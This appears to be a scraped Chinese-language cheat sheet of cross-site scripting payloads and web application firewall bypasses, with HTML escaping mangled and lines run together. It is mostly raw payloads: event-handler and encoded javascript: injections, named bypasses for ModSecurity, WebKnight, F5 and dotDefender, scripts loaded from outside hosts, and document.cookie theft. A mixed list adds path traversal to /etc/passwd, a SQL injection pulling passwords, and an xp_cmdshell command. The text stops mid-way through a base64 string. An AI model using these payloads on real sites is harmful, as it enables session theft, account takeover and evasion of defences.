&lt;/span&gt;&lt;spanclass="tag"&gt;&amp;lt;formaction&lt;/span&gt;&lt;spanclass="pun"&gt;=&lt;/span&gt;&lt;spanclass="atv"&gt;&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;&lt;/span&gt;&lt;spanclass="tag"&gt;&amp;gt;&amp;lt;button&amp;gt;&lt;/span&gt;&lt;spanclass="pln"&gt;CLICK&lt;/span&gt;“formaction”属性&lt;isindexformaction="javascript:alert(1)" type=image&gt;&lt;input type="image" formaction=JaVaScript:alert(0)&gt; &lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(1)&gt;CLICKME“background”属性&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // Works on Opera10.5 and IE6“posters” 属性&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Works Upto Opera10.5“data”属性&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;&lt;object/data=//goo.gl/nlX0P?“code”属性&lt;applet code="javascript:confirm(document.cookie);"&gt; // FirefoxOnly&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;事件处理&lt;svg/onload=prompt(1);&gt;&lt;marquee/onstart=confirm(2)&gt;/&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;短payload&lt;q/oncut=open()&gt;&lt;q/oncut=alert(1)&gt; // Useful in-case of payloadrestrictions.嵌套欺骗&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;&lt;body language=vbsonload=alert-1 // Works with IE8&lt;commandonmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6 9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/command&gt; // Works with IE8圆括号被过滤&lt;a onmouseover="javascript:window.onerror=alert;throw 1"&gt;&lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt;&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\x281\x29&amp;#039;;Expression 属性&lt;img style="xss:expression(alert(0))"&gt; // Works upto IE7.&lt;div style="color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"&gt;&lt;/div&gt; // Works upto IE7.&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // Works upto IE7“location”属性&lt;a onmouseover=location=’javascript:alert(1)&gt;click&lt;body onfocus="location=&amp;#039;javascrpt:alert(1) &gt;123其他Payload&lt;meta http-equiv="refresh" content="0;url=//goo.gl/nlX0P"&gt;&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;g onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt; // By @secalert&lt;svg xmlns:xlink=" r=100 /&gt;&lt;animateattributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/&gt; // By Mario&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt; // By @secalert&lt;meta content="&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)" http-equiv="refresh"/&gt;&lt;math&gt;&lt;a xlink:href="//jsfiddle.NET/t846h/"&gt;click // ByAshar Javed（）；：被过滤&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // Works With All Browsers( is html encoded to &amp;#40 ) is html encoded to &amp;#41Opera的变量&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Workswith Opera Only实体解码&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;a href="j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"&gt;Hello&lt;/a&gt;编码JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）href=action=formaction=location=on*=name=background=poster=src=code=data= //只支持base642.4 基于上下文的过滤WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式2.4.1 输入反射属性&lt;inputvalue="XSStest" type=text&gt;我们可以使用 “&gt;&lt;imgsrc=x onerror=prompt(0);&gt;触发，但是如果&lt;&gt;被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本" onmouseover="prompt(0) x="" onfocusin=alert(1) autofocus x="" onfocusout=alert(1) autofocus x="" onblur=alert(1) autofocus a="输入反射在&lt;script&gt;标签内类似这种情况：&lt;script&gt;Varx=”Input”;&lt;/script&gt;通常，我们使用“&gt;&lt;/script&gt;,闭合前面的&lt;/script&gt;标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()confirm() ，例如：“;alert(1)// 2.4.3 超文本内容代码中的情况如下&lt;ahref=”Userinput”&gt;Click&lt;/a&gt;可以使用javascript:alert(1)//直接执行&lt;ahref=”javascript:alert(1)//”&gt;Click&lt;/a&gt; 2.4.4 变形主要包含大小写和JavaScript变形javascript&amp;#058;alert(1)javaSCRIPT&amp;colon;alert(1)JaVaScRipT:alert(1)javas&amp;Tab;cript:\u0061lert(1);javascript:\u0061lert&amp;#x28;1&amp;#x29avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar; // AsharJavedIE10以下和URI中可以使用VBScriptvbscript:alert(1);vbscript&amp;#058;alert(1);vbscr&amp;Tab;ipt:alert(1)"Data URldata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 2.4.5JSON内容反射输入encodeURIComponent(&amp;#039;userinput&amp;#039;)可以使用-alert(1)--prompt(1)--confirm(1)-结果encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)2.4.6 输入反射在svg标签内源码如下：&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;可以输入www.site.com/test.PHP?var=text”;alert(1)//如果系统编码了”字符&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理浏览器BUG 2.4.7 字符集BUG字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。示例http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS可以控制编码，提交http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;imgsrc=x onerror=prompt(0);&gt;可以修改为UTF-32编码形式???script?alert(1)?/script?http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 2.4.8 空字节最长用来绕过mod_security防火墙，形式如下：&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;空字节只适用于PHP 5.3.8以上的版本 2.4.9 语法BUGRFC声明中节点名称不能是空格，以下的形式在javascript中不能运行&lt;script&gt;alert(1);&lt;/script&gt;&lt;%0ascript&gt;alert(1);&lt;/script&gt;&lt;%0bscript&gt;alert(1);&lt;/script&gt;&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload&lt;// style=x:expression\28write(1)\29&gt; // Works upto IE7 参考http://html5sec.org/#71&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; // Worksupto IE9 参考http://html5sec.org/#115&lt;?xml-stylesheet type="text/css"?&gt;&lt;root style="x:expression(write(1))"/&gt; // Works in IE7 参考http://html5sec.org/#77&lt;%div%20style=xss:expression(prompt(1))&gt; // Works Upto IE7 2.4.10Unicode分隔符[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：IExplorer= [0x09,0x0B,0x0C,0x20,0x3B]Chrome = [0x09,0x20,0x28,0x2C,0x3B]Safari = [0x2C,0x3B]FireFox= [0x09,0x20,0x28,0x2C,0x3B]Opera = [0x09,0x20,0x2C,0x3B]Android = [0x09,0x20,0x28,0x2C,0x3B]x0b在Mod_security中已经被过滤，绕过的方法：&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec2.4.11缺少X-frame选项通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞DocmodesIE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式expression(open(alert(1)))以下POC可以插入到IE7中&lt;html&gt; &lt;body&gt; &lt;meta http-equiv="X-UA-Compatible"content="IE=EmulateIE7" /&gt; &lt;iframesrc="https://targetwebsite.com"&gt; &lt;/body&gt; &lt;/html&gt; 2.4.12Window.name欺骗情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码POC&lt;iframesrc=&amp;#039;http://www.target.com?foo="xss autofocus/AAAAA onfocus=location=window.name//&amp;#039;name="javascript:alert("XSS")"&gt;&lt;/iframe&gt;DOM型XSS服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：&lt;script&gt; vari=location.hash; document.write(i); &lt;/script&gt;在一些情况下，反射型XSS可以转换成DOM型XSS：http://www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码Location.hash[1] = : // Defined at the first position after the hash.Location.hash[2]= ( // Defined at the second position after the hasLocation.hash[3] = ) // Defined at third position after the hash.如果有客户端过滤可能不适用 2.4.13ModSecurity绕过&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html 2.4.14WEB KNIGHT绕过&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;marquee/onstart=confirm(2)&gt;F5 BIG IP ASM and Palo ALTO绕过&lt;table background="javascript:alert(1)"&gt;&lt;/table&gt; //IE6或者低版本Opera “/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;Dot Defender绕过&lt;svg/onload=prompt(1);&gt; &lt;isindex action="javas&amp;tab;cript:alert(1)" type=image&gt;&lt;marquee/onstart=confirm(2)&gt; XSS Payload杂烩123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(vulnerable)&lt;/script&gt;%3Cscript%3Ealert('XSS')%3C/script%3E&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;img src="javascript:alert('XSS')"&gt;%0a%0a&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;.jsp%22%3cscript%3ealert(%22xss%22)%3c/script%3e%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html%3f.jsp%3f.jsp&lt;script&gt;alert('Vulnerable');&lt;/script&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;?sql_debug=1a%5c.aspxa.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;a/a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp;%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd..\..\..\..\..\..\..\..\windows\system.ini\..\..\..\..\..\..\..\..\windows\system.ini'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;&lt;IMG src="javascript:alert('XSS');"&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert("XSS")&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;"&lt;IMG src=java\0script:alert(\"XSS\")&gt;";' &gt; out&lt;IMG src=" javascript:alert('XSS');"&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;&lt;BODY ONLOAD=alert('XSS')&gt;&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;&lt;BGSOUND src="javascript:alert('XSS');"&gt;&lt;br size="&amp;&#123;alert('XSS')&#125;"&gt;&lt;LAYER src="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt;&lt;LINK REL="stylesheet" href="javascript:alert('XSS');"&gt;&lt;IMG src='vbscript:msgbox("XSS")'&gt;&lt;IMG src="mocha:[code]"&gt;&lt;IMG src="livescript:[code]"&gt;&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;&lt;IFRAME src=javascript:alert('XSS')&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;&lt;DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt;&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;&lt;IMG STYLE='xss:expre\ssion(alert("XSS"))'&gt;&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;&lt;STYLE TYPE="text/css"&gt;.XSS&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/STYLE&gt;&lt;A class="XSS"&gt;&lt;/A&gt;&lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')")&#125;&lt;/STYLE&gt;&lt;BASE href="javascript:alert('XSS');//"&gt;getURL("javascript:alert('XSS')")a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);&lt;XML src="javascript:alert('XSS');"&gt;"&gt; &lt;BODY ONLOAD="a();"&gt;&lt;SCRIPT&gt;function a()&#123;alert('XSS');&#125;&lt;/SCRIPT&gt;&lt;"&lt;SCRIPT src="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;&lt;IMG src="javascript:alert('XSS')"&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;&lt;IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;&lt;SCRIPT a="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT ="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a="&gt;" '' src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT "a='&gt;'" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt; 按标签分类的XSS Payload12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394";alert(1);//xx¼script¾alert(¢XSS¢)¼/script¾ //US-ASCII编码，如Tomcat&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt; //IE7以下&lt;![endif]--&gt;&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;a href="javascript:alert(1)"&gt;aaaa&lt;/a&gt;&lt;a href="JavaSCript:alealertrt%25281%2529"&gt;aaaa&lt;/a&gt;&lt;a onclick=alert(1)&gt;XSS&lt;/a&gt;&lt;a onmouseover=alert(1)&gt;XSS&lt;/a&gt;&lt;body onload=alert(1)&gt; //无需js标签，可直接执行&lt;body background="javascript:alert('XSS')"&gt; //IE7以下&lt;DIV style="background-image: url(javascript:alert('XSS'))"&gt; //IE7以下&lt;DIV style="width: expression(alert('XSS'));"&gt;&lt;embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"&gt;&lt;/embed&gt; //Firefox/Chrome&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt; //Firefox/Chrome/Safari&lt;iframe src=# onmouseover="alert(document.cookie)"&gt;&lt;/iframe&gt;'"&gt;&lt;img onmouseover=alert(1)&gt; //IE&lt;img onmouseover=alert(1) src&gt; //IE&lt;img src=x onmouseover=alert(1)&gt;&lt;img src=x onerror=alert(1)&gt;&lt;img/src=x onerror=alert(1)&gt;&lt;img src=1 alt=al lang=ert onerror=top[url=1]alt+lang[/url]&gt;// 下面的img标签都是在IE7以下版本生效&lt;img src=JaVaScRiPt:alert(1)&gt;&lt;img src=javascript:alert(String.fromCharCode(49))&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;img src="jav ascript:alert('XSS')"&gt; &lt;!-- 这里空格是tab --&gt;&lt;img src="jav&amp;#x09;ascript:alert('XSS');"&gt; &lt;!-- &amp;#x09;是tab --&gt;&lt;img src="jav&amp;#x0D;ascript:alert('XSS');"&gt; &lt;!-- &amp;#x0D;是回车 --&gt;&lt;img src=" &amp;#14; javascript:alert('XSS');"&gt;&lt;img DYNsrc="javascript:alert('XSS')"&gt;&lt;img LOWsrc="javascript:alert('XSS')"&gt;&lt;img src=`javascript:alert('xxxxx')`&gt;&lt;img src='vbscript:msgbox("XSS")'&gt;&lt;input type=image src=x onerror=alert(1)&gt;&lt;input type="IMAGE" src="javascript:alert('XSS');"&gt; //IE7以下&lt;link rel="stylesheet" href="javascript:alert('XSS');"&gt; //IE7以下 &lt;meta http-equiv="refresh" content="x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt; //Firefox&lt;script&gt;alert(1)&lt;/script&gt;&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;&lt;sCrsCrIptIpt&gt;alalertert(1)&lt;/ScRsCrIptipt&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt;window[url=0]'alert'[/url]&lt;/script&gt;&lt;script&gt;parent[url=1]'alert'[/url]&lt;/script&gt;&lt;script&gt;self[url=2]'alert'[/url]&lt;/script&gt;&lt;script&gt;top[url=3]'alert'[/url]&lt;/script&gt;&lt;script src=http://www.xss.com/1.js&gt;&lt;/script&gt;[quote]&lt;/script&gt;"&gt;'&gt;&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt;&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;[/quote]&lt;style&gt;li&#123;list-style-image: url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;ul&gt;&lt;li&gt;XSS&lt;/br&gt; //IE7以下&lt;style&gt;a&#123;width:expression(alert('11'))&#125;&lt;/style&gt;&lt;a href="x"&gt;&lt;/a&gt; //IE7以下&lt;style&gt;.xss&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;a class=xss&gt;&lt;/a&gt; //IE7以下&lt;style type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')");&#125;&lt;/style&gt; //IE7以下&lt;svg/onload=alert(1)&gt;&lt;table BACKGROUND="javascript:alert('XSS')"&gt; //IE7以下&lt;table&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt; //IE7以下&lt;div style="background-image: url(javascript:alert('XSS'));"&gt; //IE7以下 MarkDown XSS Payload杂烩1234567891011121314151617181920212223242526272829303132[a](javascript:prompt(document.cookie))[a](j a v a s c r i p t:prompt(document.cookie))![a](javascript:prompt(document.cookie))\&lt;javascript:prompt(document.cookie)&gt;&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[a](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)![a'"`onerror=prompt(document.cookie)](x)\[citelol]: (javascript:prompt(document.cookie))[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[test](javascript://%0d%0aprompt(1))[test](javascript://%0d%0aprompt(1);com)[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[clickme](vbscript:alert(document.domain))_http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAMAAADlCI9NAAACcFBMVEX/AAD//////f3//v7/0tL/AQH/cHD/Cwv/+/v/CQn/EBD/FRX/+Pj/ISH/PDz/6Oj/CAj/FBT/DAz/Bgb/rq7/p6f/gID/mpr/oaH/NTX/5+f/mZn/wcH/ICD/ERH/Skr/3Nz/AgL/trb/QED/z8//6+v/BAT/i4v/9fX/ZWX/x8f/aGj/ysr/8/P/UlL/8vL/T0//dXX/hIT/eXn/bGz/iIj/XV3/jo7/W1v/wMD/Hh7/+vr/t7f/1dX/HBz/zc3/nJz/4eH/Zmb/Hx//RET/Njb/jIz/f3//Ojr/w8P/Ghr/8PD/Jyf/mJj/AwP/srL/Cgr/1NT/5ub/PT3/fHz/Dw//eHj/ra3/IiL/DQ3//Pz/9/f/Ly//+fn/UFD/MTH/vb3/7Oz/pKT/1tb/2tr/jY3/6en/QkL/5OT/ubn/JSX/MjL/Kyv/Fxf/Rkb/sbH/39//iYn/q6v/qqr/Y2P/Li7/wsL/uLj/4+P/yMj/S0v/GRn/cnL/hob/l5f/s7P/Tk7/WVn/ior/09P/hYX/bW3/GBj/XFz/aWn/Q0P/vLz/KCj/kZH/5eX/U1P/Wlr/cXH/7+//Kir/r6//LS3/vr7/lpb/lZX/WFj/ODj/a2v/TU3/urr/tbX/np7/BQX/SUn/Bwf/4uL/d3f/ExP/y8v/NDT/KSn/goL/8fH/qan/paX/2Nj/HR3/4OD/VFT/Z2f/SEj/bm7/v7//RUX/Fhb/ycn/V1f/m5v/IyP/xMT/rKz/oKD/7e3/dHT/h4f/Pj7/b2//fn7/oqL/7u7/2dn/TEz/Gxv/6ur/3d3/Nzf/k5P/EhL/Dg7/o6P/UVHe/LWIAAADf0lEQVR4Xu3UY7MraRRH8b26g2Pbtn1t27Zt37Ft27Zt6yvNpPqpPp3GneSeqZo3z3r5T1XXL6nOFnc6nU6n0+l046tPruw/+Vil/C8tvfscquuuOGTPT2ZnRySwWaFQqGG8Y6j6Zzgggd0XChWLf/U1OFoQaVJ7AayUwPYALHEM6UCWBDYJbhXfHjUBOHvVqz8YABxfnDCArrED7jSAs13Px4Zo1jmA7eGEAXvXjRVQuQE4USWqp5pNoCthALePFfAQ0OcchoCGBAEPgPGiE7AiacChDfBmjjg7DVztAKRtnJsXALj/Hpiy2B9wofqW9AQAg8Bd8VOpCR02YMVEE4xli/L8AOmtQMQHsP9IGUBZedq/AWJfIez+x4KZqgDtBlbzon6A8GnonOwBXNONavlmUS2Dx8XTjcCwe1wNvGQB2gxaKhbV7Ubx3QC5bRMUuAEvA9kFzzW3TQAeVoB5cFw8zQUGPH9M4LwFgML5IpL6BHCvH0DmAD3xgIUpUJcTmy7UQHaV/bteKZ6GgGr3eAq4QQEmWlNqJ1z0BeTvgGfz4gAFsDXfUmbeAeoAF0OfuLL8C91jHnCtBchYq7YzsMsXIFkmDDsBjwBfi2o6GM9IrOshIp5mA6vc42Sg1wJMEVUJlPgDpBzWb3EAVsMOm5m7Hg5KrAjcJJ5uRn3uLAvosgBrRPUgnAgApC2HjtpRwFTneZRpqLs6Ak+Lp5lAj9+LccoCzLYPZjBA3gIGRgHj4EuxewH6JdZhKBVPM4CL7rEIiKo7kMAvILIEXplvA/bCR2JXAYMSawtkiqfaDHjNtYVfhzJJBvBGJ3zmADhv6054W71ZrBNvHZDigr0DDCcFkHeB8wog70G/